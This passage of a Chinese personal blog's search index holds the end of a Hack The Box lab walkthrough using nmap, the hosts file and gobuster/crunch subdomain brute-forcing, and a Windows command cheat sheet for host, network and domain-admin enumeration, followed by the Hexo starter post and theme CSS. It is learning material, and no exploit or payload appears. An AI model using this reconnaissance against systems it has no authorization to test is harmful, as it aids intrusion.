-p 1-65535(很慢)</p><p>​nmap -sS -T4 ip(很快,但是不一定全)</p><p><strong>2.What is the domain of the email address provided in the “Contact” section of the website?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thetoppers.htb</span><br><span class="line">Email: mail@thetoppers.htb</span><br></pre></td></tr></table></figure><p><strong>3.In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts</span><br></pre></td></tr></table></figure><p><strong>4.Which sub-domain is discovered during further enumeration?</strong>(进一步的枚举)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s3.thetoppers.htb</span><br><span class="line">gobuster vhost -w /usr/share/wordlists/dict/subnames.txt -u http://thetoppers.htb</span><br><span class="line">gobuster vhost -w wordlist.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/network/217194.html">Gobuster：一款基于Go开发的目录文件、DNS和VHost爆破工具 - FreeBuf网络安全行业门户</a></p><p>一般的字典无法爆破出子域名,自己创建字典(crunch)(提示:目标子域名只由两个字符组成)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch 2 2 &gt; words.txt</span><br><span class="line">crunch 2 2 -f charset.lst mixalpha-numeric  -o wordlist.txt </span><br></pre></td></tr></table></figure><p>注意:</p><p>默认的生成2个字符的字典是小写字母组合不带数字</p><p>charset.lst需要自己写一个文件,并不是自带的文件</p><p><a href="https://cloud.tencent.com/developer/article/1666648">字典生成神器Crunch - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>很奇怪,我扫不到s3，并且我也访问不了s3.thetoppers.htb(已修改&#x2F;etc&#x2F;hosts)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统常用命令总结</title>
      <link href="/posts/b7f5efba.html"/>
      <url>/posts/b7f5efba.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h4 id="快捷命令"><a href="#快捷命令" class="headerlink" title="快捷命令"></a>快捷命令</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">win+r：</span><br><span class="line">control 控制面板</span><br><span class="line">firewall.cpl 防火墙面板</span><br><span class="line">inetcpl.cpl  internet属性面板</span><br><span class="line">ncpa.cpl  网络连接面板</span><br><span class="line">mstsc：远程桌面</span><br><span class="line">services.msc: 本地服务列表</span><br><span class="line">secpol.msc: 本地安全策略</span><br><span class="line">gpedit.msc: 本地组策略编辑器</span><br><span class="line">eventvwr.msc: 事件查看器</span><br><span class="line">quser: 查看当前登录账户</span><br><span class="line">win+e: 快捷打开我的电脑</span><br><span class="line">win+x：事件查看器</span><br></pre></td></tr></table></figure><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>1.基本信息搜集(主机&#x2F;计算机)</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">systeminfo: 系统详细信息</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span>: 启动服务</span></span><br><span class="line"><span class="function"><span class="title">tasklist</span>: 进程列表</span></span><br><span class="line"><span class="function"><span class="title">schtasks</span>: 计划任务</span></span><br></pre></td></tr></table></figure><p>2.网络信息搜集</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ipconfig</span> /all: 判断是否存在域-dns</span><br><span class="line"><span class="built_in">net</span> view /domain: 判断存在域</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">time</span> /domain: 判断主域(域控)</span><br><span class="line">netstat -ano: 当前网络端口开放情况</span><br><span class="line">---netstat -ano|<span class="built_in">findstr</span> &quot;端口号&quot;</span><br><span class="line">nslookup 域名: 类似于<span class="built_in">ping</span>,追踪域名ip</span><br></pre></td></tr></table></figure><p>3.用户信息搜集</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">whoami: 当前用户(用户权限)</span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">all</span>: 用户权限(详细)</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">user</span>: 本地用户</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">user</span> /<span class="title">domain</span>: 域用户信息</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">localgroup</span>: 本地用户组</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> /<span class="title">domain</span>: 域用户组信息</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Admins</span>: 域管理员(默认对域控制器有完全控制权)</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Computers</span>: 域内机器</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Controllers</span>: 域控制器</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Guest</span>: 域访客</span></span><br><span class="line"><span class="function"><span class="title">Domain</span> <span class="title">Users</span>: 域用户</span></span><br><span class="line"><span class="function"><span class="title">Enterprise</span> <span class="title">Admins</span>:企业系统管理员用户(默认堆域控制器有完全控制权)</span></span><br><span class="line"><span class="function"><span class="title">wmic</span> <span class="title">useraccount</span> <span class="title">get</span> /<span class="title">all</span>: 域用户详细信息</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Domain</span> <span class="title">Admins</span>&quot; /<span class="title">domain</span>: 域管理员账户</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Enterprise</span> <span class="title">Admins</span>&quot; /<span class="title">domain</span>: 域管理员用户组</span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">group</span> &quot;<span class="title">Domain</span> <span class="title">Controllers</span>&quot; /<span class="title">domain</span>: 查询域控制器</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156.html"/>
      <url>/posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: "ZhuZiAYuanJWD";  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: "iconfont" !important;    font-size: 3em;    /* 可以定义图标大小 */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* 时间轴生肖icon */  svg.icon {    /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */    width: 1em;    height: 1em;    /* width和height定义图标的默认宽度和高度*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibli番剧插件 */  #article-container .bangumi-tab.bangumi-active {    background: var(--anzhiyu-theme);    color: var(--anzhiyu-ahoverbg);    border-radius: 10px;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: var(--anzhiyu-theme) !important;    border-radius: 10px !important;    color: var(--anzhiyu-ahoverbg) !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }  .bangumi-info-item {    border-right: 1px solid #f2b94b;  }  .bangumi-info-item span {    color: #f2b94b;  }  .bangumi-info-item em {    color: #f2b94b;  }    /* 解决artitalk的图标问题 */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* 首页文章卡片 */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* 首页侧栏卡片 */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* 文章页面正文背景 */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* 分页页面 */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* 归档页面 */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* 标签页面 */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* 分类页面 */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*夜间模式伪类遮罩层透明*/  [data-theme="dark"] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme="dark"] .card-widget {    background: #121212 !important;  }    [data-theme="dark"] div#post {    background: #121212 !important;  }    [data-theme="dark"] div#tag {    background: #121212 !important;  }    [data-theme="dark"] div#archive {    background: #121212 !important;  }    [data-theme="dark"] div#page {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: #121212 !important;  }    [data-theme="dark"] div#category {    background: transparent !important;  }  /* 页脚透明 */  #footer {    background: transparent !important;  }    /* 头图透明 */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* 滚动条 */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #3b70fc;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #3b70fc;  }    /* 音乐播放器 */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* 评论框  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* 设置评论框 */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }    /* 鼠标图标 */  body {    cursor: url("/img/x1.cur"), auto;  }  a,  [type="button"]:not(:disabled),  [type="reset"]:not(:disabled),  [type="submit"]:not(:disabled),  button:not(:disabled) {    cursor: url("/img/x2.cur"), auto !important;  }  /* md网站下划线 */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404页面 */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #3b70fc;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--anzhiyu-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* 代码框主题 */  #article-container figure.highlight {    border-radius: 10px;  }]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>命运之门</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
